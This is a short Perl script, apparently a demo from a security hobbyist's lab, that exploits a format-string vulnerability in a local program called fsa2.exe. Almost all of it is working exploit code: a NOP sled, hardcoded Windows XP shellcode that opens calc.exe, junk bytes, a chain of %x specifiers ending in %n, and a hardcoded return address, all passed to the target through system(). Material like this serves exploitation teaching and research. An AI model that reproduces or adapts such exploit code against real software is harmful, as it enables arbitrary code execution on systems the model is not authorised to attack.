#!/usr/bin/perl
# Author: mr.pr0n (@_pr0n_)
# Homepage: http://ghostinthelab.wordpress.com/
print "\n+----------------------------+\n";
print "|    Format String Attack    |\n";
print "|      Exploitation Demo     |\n";
print "+----------------------------+\n";

print "\n [*] Please wait...\n";
sleep (3);

# calc.exe - Windows XP SP2 [En]
$shellcode  =
"\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC".
"\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45".
"\xF9\x61\xC6\x45\xFA\x6C\xC6\x45\xFB\x63\x8D\x45".
"\xF8\x50\xBB\x4D\x11\x86\x7C\xFF\xD3";

# ---------------------------------- #
$nops 		= "\x90" x 10;
$junk		= "\x41" x (72 - length($nops) - length($shellcode));
$padding	= ("%x" x 57)."%.311062x%.311062x%.311061x%.311061x%n";
$ret 		= "\xA8\xE7\x12"; # RET [ 0x0012E7A8 ]
# ---------------------------------- #

$exploit 	= $nops.$shellcode.$junk.$padding.$ret;
system("fsa2.exe", $exploit);
